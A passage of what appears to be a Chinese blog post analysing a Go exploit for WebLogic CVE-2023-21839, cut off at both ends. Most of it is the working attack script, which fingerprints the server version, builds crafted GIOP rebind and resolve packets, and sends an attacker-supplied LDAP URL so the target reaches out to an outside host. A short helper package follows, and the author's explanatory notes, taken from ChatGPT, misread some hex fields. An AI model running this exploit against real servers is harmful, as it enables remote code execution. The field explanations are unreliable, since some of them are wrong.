flag.IntVar(&amp;portConfig, <span class="string">&quot;port&quot;</span>, <span class="number">7001</span>, <span class="string">&quot;port&quot;</span>)</span><br><span class="line">	flag.StringVar(&amp;ldapConfig, <span class="string">&quot;ldap&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;ldap&quot;</span>)</span><br><span class="line">	flag.Parse()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> hostConfig == <span class="string">&quot;&quot;</span> || ldapConfig == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Weblogic CVE-2023-21839&quot;</span>)</span><br><span class="line">		flag.Usage()</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> !strings.HasPrefix(ldapConfig, <span class="string">&quot;ldap&quot;</span>) &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Weblogic CVE-2023-21839&quot;</span>)</span><br><span class="line">		flag.Usage()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] your-ip: %s\n&quot;</span>, hostConfig)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] your-port: %d\n&quot;</span>, portConfig)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] your-ldap: %s\n&quot;</span>, ldapConfig)</span><br><span class="line"></span><br><span class="line">	vp := <span class="string">&quot;743320392e322e302e300a41533a3235350a484c3a39320a4d5&quot;</span> +</span><br><span class="line">		<span class="string">&quot;33a31303030303030300a50553a74333a2f2f746573743a373030310a0a&quot;</span></span><br><span class="line">	ver := giop.GetVersion(hostConfig, vp, portConfig)</span><br><span class="line">	<span class="keyword">if</span> ver == <span class="string">&quot;12&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[*] weblogic 12&quot;</span>)</span><br><span class="line">		wlsKey1 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class="line">			<span class="string">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">		wlsKey2 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class="line">			<span class="string">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6e74657874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;000000014245412c0000001000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ver == <span class="string">&quot;14&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[*] weblogic 14&quot;</span>)</span><br><span class="line">		wlsKey1 = <span class="string">&quot;00424541080103000000000c41646&quot;</span> +</span><br><span class="line">			<span class="string">&quot;d696e53657276657200000000000000003349444c3a7765626c&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6769632f636f7262612f636f732f6e616d696e672f4e616d6&quot;</span> +</span><br><span class="line">			<span class="string">&quot;96e67436f6e74657874416e793a312e30000000000002380000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000014245412e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">		wlsKey2 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657&quot;</span> +</span><br><span class="line">			<span class="string">&quot;200000000000000003349444c3a7765626c6f6769632f636f72&quot;</span> +</span><br><span class="line">			<span class="string">&quot;62612f636f732f6e616d696e672f4e616d696e67436f6e74657&quot;</span> +</span><br><span class="line">			<span class="string">&quot;874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;00000001424541&quot;</span> +</span><br><span class="line">			<span class="string">&quot;2e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[!] error and exit&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	host := hostConfig</span><br><span class="line">	port := portConfig</span><br><span class="line">	conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, host, port))</span><br><span class="line">	rmi := ldapConfig</span><br><span class="line">	<span class="comment">// [ldap len] [ldap string]</span></span><br><span class="line">	ldap := hex.EncodeToString([]<span class="type">byte</span>&#123;<span class="type">byte</span>(<span class="built_in">len</span>(rmi))&#125;)</span><br><span class="line">	ldap += hex.EncodeToString([]<span class="type">byte</span>(rmi))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	locateRequest := &amp;giop.LocateRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.LocateRequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:     giop.Int32(<span class="number">2</span>),</span><br><span class="line">		TargetAddress: giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:    giop.D(giop.NameService),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	giop.Log(<span class="number">2</span>, <span class="string">&quot;LocateRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(locateRequest.Bytes())</span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	temp1 := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">8</span>)</span><br><span class="line">	temp2 := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// GIOP Header</span></span><br><span class="line">	<span class="comment">// IOR Prefix</span></span><br><span class="line">	iOff := <span class="number">0x60</span></span><br><span class="line">	<span class="keyword">for</span> buf[iOff] != <span class="number">0x00</span> &#123;</span><br><span class="line">		<span class="comment">// ProfileHost</span></span><br><span class="line">		iOff++</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> iOff &gt; <span class="number">1024</span>*<span class="number">10</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> buf[iOff] == <span class="number">0x00</span> &#123;</span><br><span class="line">		iOff++</span><br><span class="line">	&#125;</span><br><span class="line">	p := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">2</span>)</span><br><span class="line">	p[<span class="number">0</span>] = buf[iOff]</span><br><span class="line">	iOff++</span><br><span class="line">	p[<span class="number">1</span>] = buf[iOff]</span><br><span class="line"></span><br><span class="line">	tempPort := <span class="type">int</span>(binary.BigEndian.Uint16(p))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> tempPort != port &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	lt := iOff - <span class="number">0x60</span></span><br><span class="line">	fOff := <span class="number">0x60</span> + lt + <span class="number">0x75</span></span><br><span class="line">	<span class="comment">// other cases</span></span><br><span class="line">	<span class="keyword">for</span> buf[fOff] == <span class="number">0x00</span> &#123;</span><br><span class="line">		fOff++</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Fake ObjectKey1</span></span><br><span class="line">	<span class="built_in">copy</span>(temp1[<span class="number">0</span>:<span class="number">8</span>], buf[fOff:fOff+<span class="number">8</span>])</span><br><span class="line">	<span class="built_in">copy</span>(temp2[<span class="number">4</span>:<span class="number">8</span>], buf[fOff+<span class="number">4</span>:fOff+<span class="number">8</span>])</span><br><span class="line">	<span class="comment">// Fake ObjectKey2</span></span><br><span class="line">	<span class="built_in">copy</span>(temp2[<span class="number">0</span>:<span class="number">4</span>], []<span class="type">byte</span>&#123;<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>&#125;)</span><br><span class="line">	key1 = giop.E(temp1)</span><br><span class="line">	key2 = giop.E(temp2)</span><br><span class="line"></span><br><span class="line">	wlsKey1 = strings.ReplaceAll(wlsKey1, <span class="string">&quot;&#123;&#123;key1&#125;&#125;&quot;</span>, key1)</span><br><span class="line"></span><br><span class="line">	rebindAny := &amp;giop.RebindRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.RequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:        giop.Int32(<span class="number">3</span>),</span><br><span class="line">		ResponseFlags:    []<span class="type">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class="line">		TargetAddress:    giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:       giop.D(wlsKey1),</span><br><span class="line">		RequestOperation: giop.D(giop.RebindAnyOp),</span><br><span class="line">		ServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class="line">			SequenceLength: giop.Int32(<span class="number">6</span>),</span><br><span class="line">			ServiceContext: []*giop.ServiceContext&#123;</span><br><span class="line">				ServiceContext0,</span><br><span class="line">				ServiceContext1,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;000000&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;06&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data: giop.D(<span class="string">&quot;0000000000002849444c3a6f6d672e6f72672f53656e64696e67436&quot;</span> +</span><br><span class="line">						<span class="string">&quot;f6e746578742f436f6465426173653a312e30000000000100000000000000b8000102000000000&quot;</span> +</span><br><span class="line">						<span class="string">&quot;d3137322e32362e3131322e310000ec5b000000640042454108010300000000010000000000000&quot;</span> +</span><br><span class="line">						<span class="string">&quot;0000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f646542617&quot;</span> +</span><br><span class="line">						<span class="string">&quot;3653a312e30000000000331320000000000014245412a0000001000000000000000005eedafdeb&quot;</span> +</span><br><span class="line">						<span class="string">&quot;c0d227000000001000000010000002c00000000000100200000000300010020000100010501000&quot;</span> +</span><br><span class="line">						<span class="string">&quot;10001010000000003000101000001010905010001&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;000000&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;0f&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000000000000000000100000000000000000100000000000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;03&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000&quot;</span> + key2 + <span class="string">&quot;00000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				ServiceContext2,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		StubData: giop.D(<span class="string">&quot;0000000000000001000000047465737400000001000000000000001d0000001c00000000000000010&quot;</span> +</span><br><span class="line">			<span class="string">&quot;0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384&quot;</span> +</span><br><span class="line">			<span class="string">&quot;13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242&quot;</span> +</span><br><span class="line">			<span class="string">&quot;412f57537472696e6756616c75653a312e300000000000&quot;</span> + ldap),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	giop.Log(<span class="number">3</span>, <span class="string">&quot;RebindRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(rebindAny.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	startOff := <span class="number">0x64</span> + lt + <span class="number">0xc0</span> + <span class="built_in">len</span>(host) + <span class="comment">// SendingContextRuntime</span></span><br><span class="line">		<span class="number">0xac</span> + lt + <span class="comment">// IOR ProfileHost ProfilePort</span></span><br><span class="line">		<span class="number">0x5d</span> <span class="comment">// ObjectKey Prefix</span></span><br><span class="line">	<span class="keyword">for</span> buf[startOff] != <span class="number">0x32</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> startOff &gt; <span class="number">0x2710</span> &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// InternalKey Offset</span></span><br><span class="line">		startOff++</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> startOff &gt; <span class="number">0x2710</span> &#123;</span><br><span class="line">		key3 = giop.E([]<span class="type">byte</span>&#123;<span class="number">0x32</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x00</span>&#125;)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		key3 = giop.E(buf[startOff : startOff+<span class="number">4</span>])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wlsKey2 = strings.ReplaceAll(wlsKey2, <span class="string">&quot;&#123;&#123;key3&#125;&#125;&quot;</span>, key3)</span><br><span class="line">	wlsKey2 = strings.ReplaceAll(wlsKey2, <span class="string">&quot;&#123;&#123;key1&#125;&#125;&quot;</span>, key1)</span><br><span class="line"></span><br><span class="line">	rebindAnyTwice := &amp;giop.RebindRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.RequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:        giop.Int32(<span class="number">4</span>),</span><br><span class="line">		ResponseFlags:    []<span class="type">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class="line">		TargetAddress:    giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:       giop.D(wlsKey2),</span><br><span class="line">		RequestOperation: giop.D(giop.RebindAnyOp),</span><br><span class="line">		ServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class="line">			SequenceLength: giop.Int32(<span class="number">4</span>),</span><br><span class="line">			ServiceContext: []*giop.ServiceContext&#123;</span><br><span class="line">				ServiceContext0,</span><br><span class="line">				ServiceContext1,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;03&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000&quot;</span> + key2 + <span class="string">&quot;00000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				ServiceContext2,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		StubData: giop.D(<span class="string">&quot;00000001000000047465737400000001000000000000001d0000001c00000000000000010&quot;</span> +</span><br><span class="line">			<span class="string">&quot;0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384&quot;</span> +</span><br><span class="line">			<span class="string">&quot;13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242&quot;</span> +</span><br><span class="line">			<span class="string">&quot;412f57537472696e6756616c75653a312e300000000000&quot;</span> + ldap),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	giop.Log(<span class="number">4</span>, <span class="string">&quot;RebindRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(rebindAnyTwice.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	locateRequest2 := &amp;giop.LocateRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.LocateRequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:     giop.Int32(<span class="number">5</span>),</span><br><span class="line">		TargetAddress: giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:    giop.D(giop.NameService),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	giop.Log(<span class="number">5</span>, <span class="string">&quot;LocateRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(locateRequest2.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	resolve := &amp;giop.ResolveRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.RequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:        giop.Int32(<span class="number">6</span>),</span><br><span class="line">		ResponseFlags:    []<span class="type">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class="line">		TargetAddress:    giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:       giop.D(wlsKey1),</span><br><span class="line">		RequestOperation: giop.D(giop.ResolveOp),</span><br><span class="line">		ServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class="line">			SequenceLength: giop.Int32(<span class="number">4</span>),</span><br><span class="line">			ServiceContext: []*giop.ServiceContext&#123;</span><br><span class="line">				ServiceContext0,</span><br><span class="line">				ServiceContext1,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;03&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000&quot;</span> + key2 + <span class="string">&quot;00000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				ServiceContext2,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		CosNamingDissector: giop.D(<span class="string">&quot;00000000000000010000000574657374000000000000000100&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	giop.Log(<span class="number">6</span>, <span class="string">&quot;ResolveRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(resolve.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	resolveTwice := &amp;giop.ResolveRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.RequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:        giop.Int32(<span class="number">7</span>),</span><br><span class="line">		ResponseFlags:    []<span class="type">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class="line">		TargetAddress:    giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:       giop.D(wlsKey2),</span><br><span class="line">		RequestOperation: giop.D(giop.ResolveOp),</span><br><span class="line">		ServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class="line">			SequenceLength: giop.Int32(<span class="number">4</span>),</span><br><span class="line">			ServiceContext: []*giop.ServiceContext&#123;</span><br><span class="line">				ServiceContext0,</span><br><span class="line">				ServiceContext1,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;03&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000&quot;</span> + key2 + <span class="string">&quot;00000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				ServiceContext2,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		CosNamingDissector: giop.D(<span class="string">&quot;00000000000000010000000574657374000000000000000100&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	giop.Log(<span class="number">7</span>, <span class="string">&quot;ResolveRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(resolveTwice.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	err = conn.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开始看到这个脚本让我非常困惑，其中最多的就是奇奇怪怪的数字，后面问了问chatgpt才知道</p>
<p>如</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">CosNamingDissector:</span> giop.D(<span class="string">&quot;00000000000000010000000574657374000000000000000100&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>它表示一个GIOP（General Inter-ORB Protocol）消息的二进制编码。GIOP是CORBA（Common Object Request Broker Architecture）规范中定义的一种通信协议，用于在分布式对象系统中进行通信。</p>
<p>具体来说，这个字节数组表示一个GIOP消息的头部，包括以下信息：</p>
<ul>
<li>00000000 00000001：GIOP版本号，这里表示版本1.0</li>
<li>00000000 00000101：GIOP消息标志，这里表示请求消息</li>
<li>74657374：GIOP消息类型，这里表示一个字符串消息</li>
<li>00000000 00000001：请求消息的标识符，这里为1</li>
</ul>
</blockquote>
<p>该go脚本流程大致为</p>
<blockquote>
<ol>
<li>解析命令行参数（IP地址、端口、LDAP字符串）</li>
<li>获取Weblogic版本号</li>
<li>根据Weblogic版本号设置密钥</li>
<li>连接到Weblogic服务器</li>
<li>设置ServiceContext</li>
<li>构造恶意数据包</li>
<li>发送恶意数据包</li>
<li>关闭连接</li>
</ol>
</blockquote>
<blockquote>
<p>代码中的 import 语句引用了四个不同的包：</p>
<p><code>CVE-2023-21839</code><br><code>encoding/binary</code><br><code>encoding/hex</code><br><code>flag</code><br><code>fmt</code><br><code>net</code><br><code>strings</code><br>其中， flag 用于解析命令行参数。 net 用于处理网络连接。 strings 用于字符串处理。encoding&#x2F;hex 用于十六进制编码&#x2F;解码，encoding&#x2F;binary 用于处理二进制数据。</p>
</blockquote>
<blockquote>
<p>main() 函数开始时解析命令行参数并打印相应的提示信息。然后调用 <code>giop.GetVersion()</code> 函数检测 WebLogic 服务器的版本。分析完版本后然后根据 <code>WebLogic</code> 版本选择不同的攻击方式，分别设置变量 <code>wlsKey1</code> 和 <code>wlsKey2</code>，最后使用 <code>net.Dial()</code> 函数建立与 <code>WebLogic</code> 服务器的连接。</p>
</blockquote>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> giop</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">D</span><span class="params">(str <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	data, _ := hex.DecodeString(str)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">E</span><span class="params">(b []<span class="type">byte</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> hex.EncodeToString(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Int32</span><span class="params">(i <span class="type">int</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	b := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)</span><br><span class="line">	binary.BigEndian.PutUint32(b, <span class="type">uint32</span>(i))</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>由于该漏洞的影响范围为<code>Weblogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0</code>，所以该代码先进行了网站<code>weblogic</code>版本检测，如果不是12或14版本则进行测试，否则结束</p>
<blockquote>
<p>WebLogic Server使用WLS Key来加密和解密敏感数据，例如密码和证书私钥</p>
<p>WLS Key是由WebLogic Server生成并管理的，它不是由管理员手动设置的，也不是系统默认的。在WebLogic Server启动时，它会自动生成一个WLS Key，并使用该密钥来加密和解密存储在WebLogic Server中的敏感数据，例如密码和证书私钥。</p>
<p>WebLogic Server生成的WLS Key是每个实例唯一的，每个实例都有自己的WLS Key。这是因为WLS Key是通过使用特定于WebLogic Server实例的信息生成的</p>
</blockquote>
<p>所以在下面的代码中wls作用</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ver == <span class="string">&quot;12&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[*] weblogic 12&quot;</span>)</span><br><span class="line">		wlsKey1 = <span 